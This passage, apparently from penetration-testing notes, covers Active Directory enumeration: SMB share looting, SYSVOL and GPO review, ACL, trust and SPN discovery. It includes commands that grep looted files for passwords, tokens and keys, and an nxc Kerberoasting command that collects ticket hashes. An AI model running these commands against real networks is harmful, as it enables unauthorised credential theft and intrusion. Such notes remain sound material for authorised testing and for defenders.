+<p>Recursive download in labs when allowed:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/SHARENAME<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; prompt OFF; mget *&#39;</span>
+</span></code></pre></div>
+<p><strong>Common shares</strong></p>
+<table>
+<thead>
+<tr>
+<th>Share</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SYSVOL</code></td>
+<td>GPO files, scripts, policies.</td>
+</tr>
+<tr>
+<td><code>NETLOGON</code></td>
+<td>Logon scripts.</td>
+</tr>
+<tr>
+<td><code>Users</code></td>
+<td>User folders.</td>
+</tr>
+<tr>
+<td><code>Home</code></td>
+<td>Home directories.</td>
+</tr>
+<tr>
+<td><code>Shared</code></td>
+<td>General shared files.</td>
+</tr>
+<tr>
+<td><code>IT</code></td>
+<td>Scripts, tools, docs.</td>
+</tr>
+<tr>
+<td><code>Backups</code></td>
+<td>Backup archives and configs.</td>
+</tr>
+<tr>
+<td><code>Software</code></td>
+<td>Deployment packages and scripts.</td>
+</tr>
+<tr>
+<td><code>Projects</code></td>
+<td>Application configs and docs.</td>
+</tr>
+<tr>
+<td><code>HR</code></td>
+<td>Names and user data.</td>
+</tr>
+<tr>
+<td><code>Finance</code></td>
+<td>Sensitive business files.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Interesting extensions</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>*.txt
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>*.csv
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>*.xml
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>*.json
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>*.config
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>*.conf
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>*.ini
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>*.yml
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>*.yaml
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>*.ps1
+</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a>*.bat
+</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a>*.cmd
+</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a>*.vbs
+</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a>*.sql
+</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a>*.bak
+</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a>*.zip
+</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a>*.7z
+</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a>*.kdbx
+</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a>*.rdp
+</span><span id="__span-64-20"><a id="__codelineno-64-20" name="__codelineno-64-20" href="#__codelineno-64-20"></a>*.ppk
+</span><span id="__span-64-21"><a id="__codelineno-64-21" name="__codelineno-64-21" href="#__codelineno-64-21"></a>*.pem
+</span><span id="__span-64-22"><a id="__codelineno-64-22" name="__codelineno-64-22" href="#__codelineno-64-22"></a>*.key
+</span></code></pre></div>
+<p><strong>Local search after download</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;password|passwd|pwd|cred|secret|token|apikey|api_key|connectionstring|login|user&quot;</span><span class="w"> </span>.
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>find<span class="w"> </span>.<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.kdbx&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.config&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.xml&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.sql&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="gpos">GPOs</h2>
+<p>Group Policy Objects connect AD structure with endpoint configuration.</p>
+<p>GPO enumeration can reveal scripts, local group settings, drive mappings, scheduled tasks, registry preferences, software deployment, and policy links to OUs.</p>
+<p><strong>SYSVOL</strong></p>
+<p>List SYSVOL:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>smbclient<span class="w"> </span>//<span class="nv">$DC_IP</span>/SYSVOL<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+</span></code></pre></div>
+<p>Mount SYSVOL:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/sysvol
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//<span class="nv">$DC_IP</span>/SYSVOL<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-o<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="nv">$USER</span>,password<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>,domain<span class="o">=</span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Find interesting files:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>find<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-type<span class="w"> </span>f
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>find<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.xml&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.bat&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.cmd&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.vbs&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span><span class="se">\)</span>
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;password|passwd|pwd|cred|secret|user|login|administrator&quot;</span><span class="w"> </span>/mnt/sysvol
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="nb">Get-DomainGPO</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="nb">Get-DomainGPO</span> <span class="n">-Identity</span> <span class="s2">&quot;{GUID}&quot;</span>
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="nb">Get-DomainGPOLocalGroup</span>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="nb">Get-DomainGPOUserLocalGroupMapping</span>
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="nb">Get-DomainOU</span> <span class="n">-GPLink</span> <span class="s2">&quot;*&quot;</span>
+</span></code></pre></div>
+<p>GPOs applied to a user or computer:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="nb">Get-DomainGPO</span> <span class="n">-UserIdentity</span> <span class="n">alice</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="nb">Get-DomainGPO</span> <span class="n">-ComputerIdentity</span> <span class="n">WS01</span>
+</span></code></pre></div>
+<p>Find OUs with linked GPOs:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="nb">Get-DomainOU</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">name</span><span class="p">,</span><span class="n">gplink</span>
+</span></code></pre></div>
+<p><strong>AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="nb">Get-GPO</span> <span class="n">-All</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="nb">Get-GPInheritance</span> <span class="n">-Target</span> <span class="s2">&quot;OU=Workstations,DC=corp,DC=local&quot;</span>
+</span></code></pre></div>
+<p><strong>Common GPO file locations</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\Machine\
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\User\
+</span></code></pre></div>
+<p>Interesting paths:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Machine\Scripts\
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>User\Scripts\
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>Machine\Preferences\
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>User\Preferences\
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>Machine\Microsoft\Windows NT\SecEdit\
+</span></code></pre></div>
+<p>Interesting files:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Groups.xml</code></td>
+<td>Local group preferences.</td>
+</tr>
+<tr>
+<td><code>Services.xml</code></td>
+<td>Service configuration.</td>
+</tr>
+<tr>
+<td><code>ScheduledTasks.xml</code></td>
+<td>Scheduled tasks.</td>
+</tr>
+<tr>
+<td><code>Drives.xml</code></td>
+<td>Drive mappings.</td>
+</tr>
+<tr>
+<td><code>DataSources.xml</code></td>
+<td>Database connections.</td>
+</tr>
+<tr>
+<td><code>Registry.xml</code></td>
+<td>Registry preference data.</td>
+</tr>
+<tr>
+<td><code>scripts.ini</code></td>
+<td>Startup/logon script references.</td>
+</tr>
+<tr>
+<td><code>GptTmpl.inf</code></td>
+<td>Security template settings.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="acls">ACLs</h2>
+<p>ACL enumeration identifies object-level permissions in Active Directory.</p>
+<p>This is where relationships such as <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDACL</code>, <code>WriteOwner</code>, <code>AddMember</code>, and <code>ForceChangePassword</code> become visible.</p>
+<p>This section is only enumeration. Actual abuse belongs to ACL abuse notes.</p>
+<p><strong>Important terms</strong></p>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ACL</td>
+<td>Access Control List.</td>
+</tr>
+<tr>
+<td>ACE</td>
+<td>Access Control Entry.</td>
+</tr>
+<tr>
+<td>DACL</td>
+<td>Discretionary ACL controlling access.</td>
+</tr>
+<tr>
+<td>SACL</td>
+<td>System ACL used for auditing.</td>
+</tr>
+<tr>
+<td>Owner</td>
+<td>Object owner.</td>
+</tr>
+<tr>
+<td>Trustee / Principal</td>
+<td>User, group, or computer receiving rights.</td>
+</tr>
+<tr>
+<td>Rights</td>
+<td>Permissions granted or denied.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>PowerView</strong></p>
+<p>All ACLs for an object:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="n">alice</span> <span class="n">-ResolveGUIDs</span>
+</span></code></pre></div>
+<p>ACLs for a group:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-ResolveGUIDs</span>
+</span></code></pre></div>
+<p>Find interesting domain ACLs:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="nb">Find-InterestingDomainAcl</span> <span class="n">-ResolveGUIDs</span>
+</span></code></pre></div>
+<p>Find ACLs where current user has rights:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="nb">Find-InterestingDomainAcl</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s2">&quot;$env:USERNAME&quot;</span><span class="p">}</span>
+</span></code></pre></div>
+<p>Check object owner:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="n">alice</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">ObjectDN</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span><span class="p">,</span><span class="n">IdentityReference</span><span class="p">,</span><span class="n">ObjectAceType</span>
+</span></code></pre></div>
+<p><strong>BloodHound-style rights to look for</strong></p>
+<table>
+<thead>
+<tr>
+<th>Right</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GenericAll</code></td>
+<td>Full control over object.</td>
+</tr>
+<tr>
+<td><code>GenericWrite</code></td>
+<td>Can modify many useful attributes.</td>
+</tr>
+<tr>
+<td><code>WriteDACL</code></td>
+<td>Can modify permissions.</td>
+</tr>
+<tr>
+<td><code>WriteOwner</code></td>
+<td>Can take ownership path.</td>
+</tr>
+<tr>
+<td><code>AllExtendedRights</code></td>
+<td>May include powerful extended rights.</td>
+</tr>
+<tr>
+<td><code>ForceChangePassword</code></td>
+<td>Can reset target user's password.</td>
+</tr>
+<tr>
+<td><code>AddMember</code></td>
+<td>Can add members to a group.</td>
+</tr>
+<tr>
+<td><code>AddSelf</code></td>
+<td>Principal can add itself to a group.</td>
+</tr>
+<tr>
+<td><code>ReadLAPSPassword</code></td>
+<td>Can read LAPS-managed local admin password.</td>
+</tr>
+<tr>
+<td><code>AllowedToAct</code></td>
+<td>RBCD-related relationship.</td>
+</tr>
+<tr>
+<td><code>WriteSPN</code></td>
+<td>Can modify SPNs.</td>
+</tr>
+<tr>
+<td><code>WriteAccountRestrictions</code></td>
+<td>Can affect delegation/account settings.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>LDAP security descriptor query</strong></p>
+<p>Reading raw security descriptors with LDAP is less comfortable than using PowerView or BloodHound, but useful attributes include:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>nTSecurityDescriptor
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>adminCount
+</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>owner
+</span></code></pre></div>
+<p>Example query for RBCD-related attribute:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>sAMAccountName<span class="w"> </span>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span></code></pre></div>
+<p><strong>Useful ACL targets</strong></p>
+<table>
+<thead>
+<tr>
+<th>Target type</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Users</td>
+<td>Password reset, SPN write, shadow credential paths.</td>
+</tr>
+<tr>
+<td>Groups</td>
+<td>AddMember / AddSelf paths.</td>
+</tr>
+<tr>
+<td>Computers</td>
+<td>RBCD, local admin paths, LAPS read.</td>
+</tr>
+<tr>
+<td>OUs</td>
+<td>Inherited rights over child objects.</td>
+</tr>
+<tr>
+<td>GPOs</td>
+<td>Policy control paths.</td>
+</tr>
+<tr>
+<td>Domain root</td>
+<td>Replication rights and high-impact permissions.</td>
+</tr>
+<tr>
+<td>Certificate templates</td>
+<td>AD CS escalation paths.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="trusts">Trusts</h2>
+<p>Trust enumeration identifies relationships between domains and forests.</p>
+<p>Trusts matter because users from one domain may access resources in another domain depending on trust direction, transitivity, SID filtering, and selective authentication.</p>
+<p><strong>NetExec</strong></p>
+<p>List DCs and trust context:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--dc-list
+</span></code></pre></div>
+<p>Domain trusts:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--trusted-for-delegation
+</span></code></pre></div>
+<p>Some trust enumeration may require BloodHound, PowerView, or AD module for cleaner output.</p>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="nb">Get-DomainTrust</span>
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="nb">Get-DomainTrustMapping</span>
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a><span class="nb">Get-Forest</span>
+</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a><span class="nb">Get-ForestDomain</span>
+</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a><span class="nb">Get-ForestTrust</span>
+</span></code></pre></div>
+<p>Trusts for a specific domain:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainTrust</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
+</span></code></pre></div>
+<p><strong>AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="nb">Get-ADForest</span>
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">Domains</span>
+</span></code></pre></div>
+<p><strong>nltest</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>nltest /domain_trusts
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>nltest /dclist:corp.local
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>nltest /dsgetdc:corp.local
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>Trusted domain objects:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=System,DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=trustedDomain)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>cn<span class="w"> </span>trustPartner<span class="w"> </span>trustDirection<span class="w"> </span>trustType<span class="w"> </span>trustAttributes<span class="w"> </span>flatName<span class="w"> </span>securityIdentifier
+</span></code></pre></div>
+<p><strong>Trust fields</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Trust partner</td>
+<td>Other domain or forest.</td>
+</tr>
+<tr>
+<td>Trust direction</td>
+<td>Inbound, outbound, or bidirectional.</td>
+</tr>
+<tr>
+<td>Trust type</td>
+<td>Parent-child, external, forest, etc.</td>
+</tr>
+<tr>
+<td>Transitive</td>
+<td>Whether trust extends beyond direct trust.</td>
+</tr>
+<tr>
+<td>SID filtering</td>
+<td>Affects SID-based abuse paths.</td>
+</tr>
+<tr>
+<td>Selective authentication</td>
+<td>Limits access across trust.</td>
+</tr>
+<tr>
+<td>Forest trust</td>
+<td>Trust between forests.</td>
+</tr>
+<tr>
+<td>External trust</td>
+<td>Trust with external domain.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Direction reminder</strong></p>
+<table>
+<thead>
+<tr>
+<th>Direction</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Inbound trust</td>
+<td>Other domain trusts this domain's users.</td>
+</tr>
+<tr>
+<td>Outbound trust</td>
+<td>This domain trusts other domain's users.</td>
+</tr>
+<tr>
+<td>Bidirectional</td>
+<td>Both directions.</td>
+</tr>
+</tbody>
+</table>
+<p>Trust direction can be confusing. Always verify with tool output and target access.</p>
+<hr />
+<h2 id="spns">SPNs</h2>
+<p>SPN enumeration identifies accounts associated with Kerberos services.</p>
+<p>SPNs are important because they reveal service accounts, service locations, and Kerberos service-ticket targets.</p>
+<p>This section only covers enumeration. Kerberoasting itself belongs to credential access / Kerberos attack notes.</p>
+<p><strong>NetExec</strong></p>
+<p>Kerberoast-style SPN discovery:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--kerberoasting<span class="w"> </span>kerberoast_hashes.txt
+</span></code></pre></div>
+<p>This can request roastable tickets, so treat it as credential-access activity if the rules of engagement separate enumeration from ticket requests.</p>
+<p>For pure LDAP-style discovery, use LDAP queries.</p>
+<p><strong>LDAP</strong></p>
+<p>Users with SPNs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>sAMAccountName<span class="w"> </span>servicePrincipalName<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet<span class="w"> </span>lastLogonTimestamp
+</span></code></pre></div>
+<p>Computers with SPNs:</p>
